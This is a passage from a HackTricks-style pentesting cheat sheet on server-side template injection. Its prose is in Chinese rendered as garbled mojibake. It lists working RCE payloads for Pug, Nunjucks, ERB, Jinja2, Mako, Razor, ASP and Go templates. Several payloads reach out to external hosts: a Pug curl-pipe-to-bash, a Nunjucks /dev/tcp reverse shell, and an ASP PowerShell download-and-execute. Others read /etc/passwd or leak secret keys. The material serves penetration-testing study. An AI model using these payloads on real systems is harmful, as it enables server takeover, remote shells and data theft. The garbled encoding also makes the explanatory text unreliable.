* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**æœåŠ¡å™¨ç«¯æ¸²æŸ“ç¤ºä¾‹**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**æ›´å¤šä¿¡æ¯**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = æ²¡æœ‰è¾“å‡º
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = é”™è¯¯
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**æ›´å¤šä¿¡æ¯**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERBï¼ˆRubyï¼‰

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£æœ‰å…³åœ¨Pythonä¸­ç»•è¿‡æ²™ç®±çš„**ä»»æ„å‘½ä»¤æ‰§è¡ŒæŠ€å·§**ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**æ›´å¤šä¿¡æ¯**

### Jinja2ï¼ˆPythonï¼‰

[å®˜æ–¹ç½‘ç«™](http://jinja.pocoo.org)

> Jinja2æ˜¯ä¸€ä¸ªåŠŸèƒ½é½å…¨çš„Pythonæ¨¡æ¿å¼•æ“ã€‚å®ƒå…·æœ‰å®Œå…¨çš„Unicodeæ”¯æŒï¼Œå¯é€‰çš„é›†æˆæ²™ç®±æ‰§è¡Œç¯å¢ƒï¼Œè¢«å¹¿æ³›ä½¿ç”¨å¹¶ä¸”ä½¿ç”¨BSDè®¸å¯è¯ã€‚

* `{{7*7}} = é”™è¯¯`
* `${7*7} = ${7*7}`
* `{{foobar}} æ— ç»“æœ`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - æ¨¡æ¿æ ¼å¼**

Jinja2æ˜¯ä¸€ç§æµè¡Œçš„Pythonæ¨¡æ¿å¼•æ“ï¼Œå¸¸ç”¨äºWebåº”ç”¨ç¨‹åºä¸­çš„æœåŠ¡å™¨ç«¯æ¨¡æ¿æ¸²æŸ“ã€‚å®ƒå…·æœ‰ç®€æ´çš„è¯­æ³•å’Œå¼ºå¤§çš„åŠŸèƒ½ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿè½»æ¾åœ°ç”ŸæˆåŠ¨æ€å†…å®¹ã€‚

Jinja2æ¨¡æ¿ä½¿ç”¨åŒå¤§æ‹¬å·`{{ }}`æ¥è¡¨ç¤ºå˜é‡ï¼Œå¹¶ä½¿ç”¨`{% %}`æ¥è¡¨ç¤ºæ§åˆ¶æµè¯­å¥ï¼Œå¦‚æ¡ä»¶è¯­å¥å’Œå¾ªç¯è¯­å¥ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„Jinja2æ¨¡æ¿è¯­æ³•ç¤ºä¾‹ï¼š

- å˜é‡æ’å€¼ï¼š`{{ variable }}`
- æ§åˆ¶æµè¯­å¥ï¼š`{% if condition %} ... {% endif %}`
- å¾ªç¯è¯­å¥ï¼š`{% for item in list %} ... {% endfor %}`
- è¿‡æ»¤å™¨ï¼š`{{ variable | filter }}`

Jinja2æ¨¡æ¿è¿˜æ”¯æŒåµŒå¥—å’Œç»§æ‰¿ï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ„å»ºå¤æ‚çš„æ¨¡æ¿ç»“æ„ã€‚

**æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰**

æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœåŠ¡å™¨ç«¯æ¨¡æ¿ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„æ¨¡æ¿ä»£ç æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€è®¿é—®æ•æ„Ÿæ•°æ®æˆ–å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚

SSTIæ¼æ´é€šå¸¸å‘ç”Ÿåœ¨æœªæ­£ç¡®è¿‡æ»¤æˆ–éªŒè¯ç”¨æˆ·è¾“å…¥çš„æƒ…å†µä¸‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ³¨å…¥Jinja2æ¨¡æ¿ä»£ç æ¥åˆ©ç”¨è¿™ç§æ¼æ´ã€‚

**åˆ©ç”¨SSTIæ¼æ´**

è¦åˆ©ç”¨SSTIæ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ¥å—ç”¨æˆ·è¾“å…¥å¹¶å°†å…¶ä½œä¸ºæ¨¡æ¿æ¸²æŸ“çš„æ¼æ´ç‚¹ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ³¨å…¥æ¶æ„çš„Jinja2æ¨¡æ¿ä»£ç æ¥æ‰§è¡Œä»»æ„å‘½ä»¤æˆ–è®¿é—®æ•æ„Ÿæ•°æ®ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„SSTIæ¼æ´åˆ©ç”¨æŠ€å·§ï¼š

- æ‰§è¡Œå‘½ä»¤ï¼šé€šè¿‡æ³¨å…¥`{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['os'].<command> }}`æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
- è®¿é—®æ•æ„Ÿæ•°æ®ï¼šé€šè¿‡æ³¨å…¥`{{ config.items() }}`æ¥è®¿é—®åº”ç”¨ç¨‹åºçš„é…ç½®ä¿¡æ¯ã€‚
- æ§åˆ¶æµè¯­å¥ç»•è¿‡ï¼šé€šè¿‡æ³¨å…¥`{{ ''.__class__.__mro__[1].__subclasses__()[<index>].__init__.__globals__['__builtins__']['<function>'](<arguments>) }}`æ¥ç»•è¿‡æ§åˆ¶æµè¯­å¥çš„é™åˆ¶ã€‚

**é˜²å¾¡SSTIæ¼æ´**

è¦é˜²å¾¡SSTIæ¼æ´ï¼Œå¼€å‘äººå‘˜åº”è¯¥å§‹ç»ˆå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›é˜²å¾¡æªæ–½ï¼š

- ä½¿ç”¨ç™½åå•è¿‡æ»¤ï¼šåªå…è®¸ç‰¹å®šçš„å®‰å…¨æ¨¡æ¿æ ‡ç­¾å’Œè¿‡æ»¤å™¨ã€‚
- è¾“å…¥éªŒè¯ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œç¡®ä¿å…¶ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œç±»å‹ã€‚
- æ¨¡æ¿æ²™ç®±ï¼šå°†æ¨¡æ¿æ¸²æŸ“é™åˆ¶åœ¨å®‰å…¨çš„æ²™ç®±ç¯å¢ƒä¸­ï¼Œä»¥é˜²æ­¢æ¶æ„ä»£ç æ‰§è¡Œã€‚

é€šè¿‡é‡‡å–è¿™äº›é˜²å¾¡æªæ–½ï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘SSTIæ¼æ´çš„é£é™©ï¼Œå¹¶æé«˜åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**ä¸ä¾èµ–**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__` çš„ RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ï¼š
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**å…³äºå¦‚ä½•æ»¥ç”¨Jinjaçš„æ›´å¤šç»†èŠ‚**ï¼š

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Makoï¼ˆPythonï¼‰
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= æˆåŠŸ`
* `@() <= æˆåŠŸ`
* `@("{{code}}") <= æˆåŠŸ`
* `@ <= æˆåŠŸ`
* `@{} <= é”™è¯¯ï¼`
* `@{ <= é”™è¯¯ï¼`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NETçš„`System.Diagnostics.Process.Start`æ–¹æ³•å¯ç”¨äºåœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨ä»»ä½•è¿›ç¨‹ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªWebshellã€‚æ‚¨å¯ä»¥åœ¨[https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)ä¸­æ‰¾åˆ°ä¸€ä¸ªæ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºç¤ºä¾‹ã€‚

**æ›´å¤šä¿¡æ¯**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = æ— 
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**æ›´å¤šä¿¡æ¯**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojoliciousï¼ˆPerlï¼‰

å³ä½¿æ˜¯Perlï¼Œå®ƒä¹Ÿä½¿ç”¨ç±»ä¼¼Rubyä¸­çš„ERBæ ‡ç­¾ã€‚

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Error`
```
<%= perl code %>
<% perl code %>
```
### GOä¸­çš„SSTI

ç¡®è®¤åç«¯ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“æ˜¯Goçš„æ–¹æ³•æ˜¯ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼š

* `{{ . }}` = ä½œä¸ºè¾“å…¥ä¼ é€’ç»™æ¨¡æ¿çš„æ•°æ®ç»“æ„
* å¦‚æœä¼ é€’çš„æ•°æ®æ˜¯ä¸€ä¸ªåŒ…å«å±æ€§Passwordçš„å¯¹è±¡ï¼Œå‰é¢çš„æœ‰æ•ˆè½½è·å°†æ³„éœ²å®ƒï¼Œä½†ä½ ä¹Ÿå¯ä»¥è¿™æ ·åšï¼š`{{ .Password }}`
* `{{printf "%s" "ssti" }}` = åº”è¯¥åœ¨å“åº”ä¸­è¾“å‡ºå­—ç¬¦ä¸²ssti
* `{{html "ssti"}}`, `{{js "ssti"}}` = è¿™äº›æ˜¯ä¸€äº›å…¶ä»–æœ‰æ•ˆè½½è·ï¼Œåº”è¯¥è¾“å‡ºå­—ç¬¦ä¸²"ssti"ï¼Œè€Œä¸å¸¦æœ‰å°¾éšçš„å•è¯"js"æˆ–"html"ã€‚ä½ å¯ä»¥åœ¨[è¿™é‡Œ](https://golang.org/pkg/text/template)æŸ¥çœ‹å¼•æ“ä¸­çš„æ›´å¤šå…³é”®å­—ã€‚

**XSSåˆ©ç”¨**

å¦‚æœæœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯text/templateåŒ…ï¼Œé€šè¿‡å°†**æœ‰æ•ˆè½½è·**ä½œä¸ºè¾“å…¥æä¾›ï¼Œå¾ˆå®¹æ˜“å®ç°XSSã€‚ç„¶è€Œï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯html/templateï¼Œå®ƒä¼šå¯¹å“åº”è¿›è¡ŒHTMLç¼–ç ï¼š`{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

ç„¶è€Œï¼ŒGoå…è®¸**å®šä¹‰**ä¸€ä¸ªå®Œæ•´çš„**æ¨¡æ¿**ï¼Œç„¶å**ç¨åè°ƒç”¨å®ƒ**ã€‚æœ‰æ•ˆè½½è·å°†ç±»ä¼¼äºï¼š\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCEåˆ©ç”¨**

html/templateæ¨¡å—çš„æ–‡æ¡£å¯ä»¥åœ¨[è¿™é‡Œ](https://golang.org/pkg/html/template/)æ‰¾åˆ°ï¼Œtext/templateæ¨¡å—çš„æ–‡æ¡£å¯ä»¥åœ¨[è¿™é‡Œ](https://golang.org/pkg/text/template/)æ‰¾åˆ°ï¼Œæ˜¯çš„ï¼Œå®ƒä»¬ç¡®å®æœ‰å¾ˆå¤§çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼Œåœ¨text/templateä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨â€œcallâ€å€¼**ç›´æ¥è°ƒç”¨ä»»ä½•å…¬å…±å‡½æ•°**ï¼Œä½†åœ¨html/templateä¸­ä¸æ˜¯è¿™æ ·ã€‚

å¦‚æœä½ æƒ³é€šè¿‡SSTIåœ¨Goä¸­æ‰¾åˆ°ä¸€ä¸ªRCEï¼Œä½ åº”è¯¥çŸ¥é“ï¼Œä½ å¯ä»¥ä½¿ç”¨`{{ . }}`è®¿é—®æ¨¡æ¿ä¸­ç»™å®šçš„å¯¹è±¡ï¼Œä½ ä¹Ÿå¯ä»¥**è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•**ã€‚å› æ­¤ï¼Œå‡è®¾ä¼ é€’çš„å¯¹è±¡æœ‰ä¸€ä¸ªåä¸ºSystemçš„æ–¹æ³•æ¥æ‰§è¡Œç»™å®šçš„å‘½ä»¤ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ»¥ç”¨å®ƒï¼š`{{ .System "ls" }}`\
å› æ­¤ï¼Œä½ å¯èƒ½éœ€è¦**æºä»£ç **ã€‚ç±»ä¼¼äºè¿™æ ·çš„æ½œåœ¨æºä»£ç å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**æ›´å¤šä¿¡æ¯**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### æ›´å¤šåˆ©ç”¨

æŸ¥çœ‹[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)ä¸­çš„å…¶ä»–åˆ©ç”¨ã€‚æ‚¨è¿˜å¯ä»¥åœ¨[https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)ä¸­æ‰¾åˆ°æœ‰è¶£çš„æ ‡ç­¾ä¿¡æ¯ã€‚

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## ç›¸å…³å¸®åŠ©

å¦‚æœæ‚¨è®¤ä¸ºæœ‰ç”¨ï¼Œè¯·é˜…è¯»ï¼š

* [FlaskæŠ€å·§](../../network-services-pentesting/pentesting-web/flask.md)
* [Pythoné­”æœ¯å‡½æ•°](broken-reference/)

## å·¥å…·

{% embed url="https://github.com/epinna/tplmap" %}

## æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ç»ƒä¹ å’Œå‚è€ƒ

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­å®£ä¼ æ‚¨çš„å…¬å¸å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
